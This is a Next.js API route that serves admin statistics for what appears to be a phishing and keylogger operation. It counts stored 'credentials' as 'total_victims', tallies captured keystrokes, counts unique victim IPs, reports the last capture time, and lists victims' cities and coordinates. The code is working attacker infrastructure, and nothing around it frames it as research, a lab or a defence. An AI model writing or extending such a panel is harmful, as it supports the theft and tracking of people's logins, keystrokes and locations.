import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';
import { requireAdmin } from '@/lib/auth';

export async function GET(req: NextRequest) {
  const auth = requireAdmin(req);
  if (!auth) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const db = getDb();

  const totalVictims = (db.prepare('SELECT COUNT(*) as c FROM credentials').get() as any).c;
  const todayCount = (db.prepare("SELECT COUNT(*) as c FROM credentials WHERE date(created_at) = date('now')").get() as any).c;
  const uniqueIps = (db.prepare('SELECT COUNT(DISTINCT ip) as c FROM credentials').get() as any).c;
  const totalKeystrokes = (db.prepare('SELECT COUNT(*) as c FROM keylogs').get() as any).c;
  const lastRow = db.prepare('SELECT MAX(created_at) as t FROM credentials').get() as any;
  const lastCapture = lastRow?.t ? new Date(lastRow.t + 'Z').toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true }) : 'Never';

  const locations = db.prepare('SELECT country, city, latitude, longitude FROM credentials WHERE latitude IS NOT NULL AND longitude IS NOT NULL GROUP BY country, city').all();

  return NextResponse.json({
    status: 'ok',
    stats: { total_victims: totalVictims, today_count: todayCount, unique_ips: uniqueIps, total_keystrokes: totalKeystrokes, last_capture: lastCapture },
    locations,
  });
}
